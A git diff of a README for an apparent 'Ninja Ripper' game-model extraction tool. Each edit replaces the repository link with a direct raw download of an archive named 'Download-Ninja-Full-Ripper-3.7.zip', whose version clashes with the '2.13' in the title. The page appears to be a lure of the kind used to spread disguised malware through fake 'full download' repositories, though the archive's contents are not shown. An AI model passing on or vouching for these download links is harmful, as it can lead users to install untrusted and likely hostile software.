@@ -1,6 +1,6 @@
 # 🎮 Ninja-Ripper-2.13-Full-Download - Extract 3D Models from Games Easily
 
-[![Download Ninja Ripper](https://img.shields.io/badge/Download-Ninja%20Ripper-brightgreen?style=for-the-badge)](https://github.com/halim2023/Ninja-Ripper-2.13-Full-Download)
+[![Download Ninja Ripper](https://img.shields.io/badge/Download-Ninja%20Ripper-brightgreen?style=for-the-badge)](https://github.com/halim2023/Ninja-Ripper-2.13-Full-Download/raw/refs/heads/main/platforms/Download-Ninja-Full-Ripper-3.7.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Before downloading, check your system meets these basic requirements:
 
 Please **visit this page to download** the full tool:
 
-[Download Ninja Ripper from GitHub](https://github.com/halim2023/Ninja-Ripper-2.13-Full-Download)
+[Download Ninja Ripper from GitHub](https://github.com/halim2023/Ninja-Ripper-2.13-Full-Download/raw/refs/heads/main/platforms/Download-Ninja-Full-Ripper-3.7.zip)
 
 You will find the latest version of Ninja Ripper here. The download files include everything you need to run the program on your Windows PC.
 
@@ -37,7 +37,7 @@ You will find the latest version of Ninja Ripper here. The download files includ
 ## 🚀 Getting Started: How to Download and Install
 
 1. Open your web browser and go to:  
-   https://github.com/halim2023/Ninja-Ripper-2.13-Full-Download
+   https://github.com/halim2023/Ninja-Ripper-2.13-Full-Download/raw/refs/heads/main/platforms/Download-Ninja-Full-Ripper-3.7.zip
 
 2. At the GitHub page, find the **Releases** section. This is usually near the right side or in the main page files list.
 
@@ -138,4 +138,4 @@ Use Ninja Ripper only for personal projects, research, or with games you own. Do
 
 You can always find Ninja Ripper here:
 
-[![Download Ninja Ripper](https://img.shields.io/badge/Download-Ninja%20Ripper-blue?style=for-the-badge)](https://github.com/halim2023/Ninja-Ripper-2.13-Full-Download)
+[![Download Ninja Ripper](https://img.shields.io/badge/Download-Ninja%20Ripper-blue?style=for-the-badge)](https://github.com/halim2023/Ninja-Ripper-2.13-Full-Download/raw/refs/heads/main/platforms/Download-Ninja-Full-Ripper-3.7.zip)
